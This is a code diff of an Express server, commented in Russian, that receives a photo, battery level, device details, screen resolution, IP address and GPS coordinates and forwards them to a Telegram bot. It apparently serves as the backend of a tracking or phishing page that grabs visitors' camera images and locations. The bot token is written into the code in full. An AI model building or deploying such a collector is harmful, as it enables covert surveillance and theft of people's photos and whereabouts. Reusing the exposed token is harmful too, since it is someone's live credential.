@@ -1,3 +1,4 @@
+// Серверный код
 import express from 'express';
 import axios from 'axios';
 import FormData from 'form-data';
@@ -8,9 +9,9 @@ import ip from 'express-ip';
 const app = express();
 const PORT = 5000;
 
-app.set('trust proxy', true); // Устанавливаем для Express доверие к прокси-серверу
+app.set('trust proxy', true);
 
-app.use(ip().getIpInfoMiddleware); // Используем middleware для получения информации об IP адресе
+app.use(ip().getIpInfoMiddleware);
 
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
@@ -19,7 +20,7 @@ app.use(express.json());
 app.use(cors());
 
 app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
-  const { chat_id, batteryLevel, deviceInfo } = req.body;
+  const { chat_id, batteryLevel, deviceInfo, screenWidth, screenHeight, clientIp } = req.body;
   const photo = req.file;
 
   if (!photo) {
@@ -27,9 +28,9 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
   }
 
   try {
-    const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
+    const userIP = req.headers['x-forwarded-for'] || clientIp;
 
-    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота
+    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendPhoto`;
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
@@ -45,7 +46,7 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
                     `🌐 Browser: ${req.headers['user-agent']}\n\n` +
                     `📱 Тип устройства: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
                     `🖥 Платформа: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
-                    `📏 Разрешение экрана: ${req.headers['screen-width']}x${req.headers['screen-height']}`;
+                    `📏 Разрешение экрана: ${screenWidth}x${screenHeight}`;
 
     formData.append('caption', caption);
 
@@ -63,12 +64,11 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
   }
 });
 
-
 app.post('/sendLocationToTelegram', async (req, res) => {
-  const { chat_id, latitude, longitude } = req.body;
+  const { chat_id, latitude, longitude, clientIp } = req.body;
 
   try {
-    const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
+    const userIP = req.headers['x-forwarded-for'] || clientIp;
 
     const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendLocation`;
 
